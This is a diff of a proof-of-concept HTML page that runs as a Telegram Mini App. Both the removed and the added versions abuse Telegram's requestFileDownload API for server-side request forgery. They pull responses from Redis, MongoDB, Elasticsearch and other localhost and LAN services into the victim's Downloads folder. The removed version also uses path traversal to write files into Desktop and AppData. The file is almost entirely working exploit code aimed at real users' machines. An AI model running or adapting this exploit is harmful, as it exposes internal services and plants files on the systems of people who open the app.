@@ -1,85 +1,124 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>Telegram SSRF PoC</title></head>
-<body style="background:#000;color:#fff;font:14px monospace;padding:0;margin:0">
-
-<div id="out" style="padding:12px;white-space:pre-wrap"></div>
-
-<button onclick="startAll()" id="btn" style="margin:12px;padding:8px 16px;
-  font:16px monospace;background:#f44;color:#fff;border:none;cursor:pointer">
-  FIRE SSRF SCAN
-</button>
+<head><meta charset="utf-8"><title>SSRF PoC v2</title>
+<style>
+body{background:#0a0a0a;color:#ddd;font:13px monospace;margin:0;padding:12px}
+h2{color:#f44;margin:0}
+#log{background:#111;padding:8px;margin:8px 0;max-height:300px;overflow:auto;white-space:pre-wrap;font:11px monospace}
+.ok{color:#0f0}.err{color:#f44}.info{color:#ff0}
+button{display:block;width:100%;margin:4px 0;padding:10px;background:#222;color:#fff;border:1px solid #444;font-size:12px;cursor:pointer;text-align:left}
+button.fire{background:#4a0000;border-color:#f44;font-size:14px}
+</style></head><body>
+<h2>SSRF PoC v2</h2>
+<div id="status">Initializing...</div>
+<div id="log"></div>
+<div id="btns"></div>
 
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
-const TW = window.Telegram.WebApp;
-TW.ready();
-TW.expand();
+function L(s,c) {
+  const d = document.getElementById('log');
+  d.innerHTML += `<span class="${c||''}">${s}</span>\n`;
+  d.scrollTop = d.scrollHeight;
+}
 
-const out = document.getElementById('out');
-function L(s) { out.textContent += s + '\n'; }
+L('=== Diagnostic Mode ===','info');
+L(`UserAgent: ${navigator.userAgent}`,'info');
 
-L('=== Telegram Desktop SSRF via requestFileDownload ===');
-L('Target: localhost + LAN services');
-L('');
+const TW = window.Telegram?.WebApp;
+if (!TW) {
+  L('FATAL: Telegram.WebApp not found!','err');
+  document.getElementById('status').innerHTML = '<span class="err">NOT in Telegram</span>';
+} else {
+  L(`WebApp found: v${TW.version}`,'ok');
+  L(`initData: ${TW.initData?.substring(0,80)}...`,'ok');
+  TW.ready();
+  TW.expand();
+  document.getElementById('status').innerHTML = '<span class="ok">Telegram WebApp connected</span>';
 
-const TARGETS = [
-  ['http://127.0.0.1:11434/api/tags',             'ollama.json',   'Ollama AI'],
-  ['http://127.0.0.1:7860/sdapi/v1/models',       'sd_models.json','SD WebUI'],
-  ['http://127.0.0.1:5000/',                      'flask.json',    'Flask dev'],
-  ['http://127.0.0.1:3000/',                      'next.json',     'Next.js dev'],
-  ['http://127.0.0.1:8080/',                      'tomcat.json',   'Tomcat'],
-  ['http://127.0.0.1:9200/',                      'elastic.json',  'Elasticsearch'],
-  ['http://127.0.0.1:27017/',                     'mongo.resp',    'MongoDB'],
-  ['http://127.0.0.1:6379/',                      'redis.resp',    'Redis'],
-  ['http://127.0.0.1:8500/v1/agent/members',      'consul.json',   'Consul'],
-  ['http://192.168.1.1/',                         'router.html',   'Router'],
-  ['http://192.168.0.1/',                         'router2.html',  'Router alt'],
-  ['http://localhost:5173/',                      'vite.html',     'Vite dev'],
-];
+  L(`TW.requestFileDownload = ${typeof TW.requestFileDownload}`,'info');
+  L(`TW.isVersionAtLeast = ${typeof TW.isVersionAtLeast}`,'info');
 
-let fired = 0;
-
-function fireNext() {
-  if (fired >= TARGETS.length) {
-    L(''); L('=== Scan complete. Check your Downloads folder. ===');
-    L('Any non-empty files = vulnerable internal service discovered!');
-    L(''); L('=== BUG: attach_bot_webview.cpp:3343 ===');
-    L('processDownloadRequest() - no URL validation');
-    L('_delegate->botDownloadFile() - passes raw URL to QNetworkAccessManager');
-    return;
-  }
-  const [url, name, desc] = TARGETS[fired];
-  L(`[${fired+1}/${TARGETS.length}] ${desc}: ${url}`);
-
-  if (TW.requestFileDownload) {
-    TW.requestFileDownload({url: url, file_name: name});
+  if (typeof TW.requestFileDownload === 'function') {
+    L('requestFileDownload is AVAILABLE','ok');
   } else {
-    L('  [!] requestFileDownload not supported');
+    L('requestFileDownload NOT available - using postMessage fallback','info');
   }
-  fired++;
-  setTimeout(fireNext, 800);
-}
 
-// Also demonstrate the path-traversal variant
-function doPathTraversal() { L(''); L('=== Path traversal in filename ===');
-  if (!TW.requestFileDownload) {
-    L('  [!] Not supported'); return;
-  }
-  const urls = [
-    ['https://example.com/index.html', '../../Desktop/pwned.txt'],
-    ['https://example.com/favicon.ico', '../AppData/Roaming/evil.ico'],
+  const TARGETS = [
+    ['http://127.0.0.1:5000/', 'flask_leak.json'],
+    ['http://127.0.0.1:9200/', 'elastic_leak.json'],
+    ['http://127.0.0.1:6379/', 'redis_leak.txt'],
+    ['http://127.0.0.1:27017/', 'mongo_leak.txt'],
+    ['http://127.0.0.1:9999/ssrf_capture', 'capture_test.txt'],
   ];
-  for (const [url, name] of urls) {
-    L(`  Requesting: ${name}`);
-    TW.requestFileDownload({url, file_name: name});
-  }
-}
 
-function startAll() {
-  document.getElementById('btn').style.display = 'none';
-  fireNext();
-  setTimeout(doPathTraversal, 12000);
+  function fire(idx) {
+    const [url, name] = TARGETS[idx];
+    L(`[${idx+1}/${TARGETS.length}] ${url} -> ${name}`,'info');
+
+    let sent = false;
+
+    if (typeof TW.requestFileDownload === 'function') {
+      try {
+        TW.requestFileDownload({url: url, file_name: name});
+        L('  -> Sent via TW.requestFileDownload','ok');
+        sent = true;
+      } catch(e) {
+        L(`  -> TW.requestFileDownload ERROR: ${e.message}`,'err');
+      }
+    }
+
+    if (!sent && typeof TW.postEvent === 'function') {
+      try {
+        TW.postEvent('web_app_request_file_download', '', {url: url, file_name: name});
+        L('  -> Sent via TW.postEvent','ok');
+        sent = true;
+      } catch(e) {
+        L(`  -> TW.postEvent ERROR: ${e.message}`,'err');
+      }
+    }
+
+    if (!sent) {
+      try {
+        window.parent.postMessage(JSON.stringify({
+          eventType: 'web_app_request_file_download',
+          eventData: {url: url, file_name: name}
+        }), '*');
+        L('  -> Sent via postMessage fallback','ok');
+        sent = true;
+      } catch(e) {
+        L(`  -> postMessage ERROR: ${e.message}`,'err');
+      }
+    }
+  }
+
+  TW.onEvent('file_download_requested', function(e) {
+    L(`  <- EVENT: ${JSON.stringify(e)}`,'ok');
+  });
+
+  let idx = 0;
+  function fireNext() {
+    if (idx >= TARGETS.length) {
+      L('=== SCAN COMPLETE ===','info');
+      L('Check http://127.0.0.1:9999 in browser','info');
+      L('Check Downloads folder for leaked files','info');
+      return;
+    }
+    fire(idx);
+    idx++;
+    setTimeout(fireNext, 2000);
+  }
+
+  const btns = document.getElementById('btns');
+  btns.innerHTML = `
+    <button class="fire" onclick="idx=0;fireNext()">FIRE: Auto-Scan All 5 Services</button>
+    <button onclick="idx=0;fire(0)">Single: Flask Dev (:5000)</button>
+    <button onclick="idx=0;fire(1)">Single: Elastic (:9200)</button>
+    <button onclick="idx=0;fire(2)">Single: Redis (:6379)</button>
+    <button onclick="idx=0;fire(3)">Single: MongoDB (:27017)</button>
+    <button onclick="idx=0;fire(4)">Single: Monitor (:9999)</button>
+  `;
 }
 </script>
 </body>
